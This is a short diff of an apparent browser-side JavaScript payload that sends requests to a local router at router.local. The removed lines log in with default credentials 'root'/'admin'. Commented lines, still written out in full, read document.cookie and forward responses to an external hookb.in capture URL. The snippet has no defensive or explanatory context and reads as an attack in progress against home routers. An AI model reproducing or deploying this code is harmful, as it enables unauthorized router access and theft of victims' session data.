@@ -1,6 +1,6 @@
 const http = new XMLHttpRequest();
-http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-http.open('POST', 'http://router.local/login.php', true);
+//http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+//http.open('POST', 'http://router.local/login.php', true);
 // http.addEventListener('load', function (event) {
 //     const xhr = new XMLHttpRequest();
 //     xhr.open('POST', 'https://hookb.in/nP0RO6rjzOTZ7Qrrd2Z1', true);
@@ -17,7 +17,7 @@ http.onload = function () {
         
     }
 };
-//http.open('GET', 'http://router.local/login.php/');
+http.open('GET', 'http://router.local');
 //"username=root&pin=admin¬Robot=on"
 //const cook = document.cookie;
-http.send("username=root&pin=admin");
+http.send();
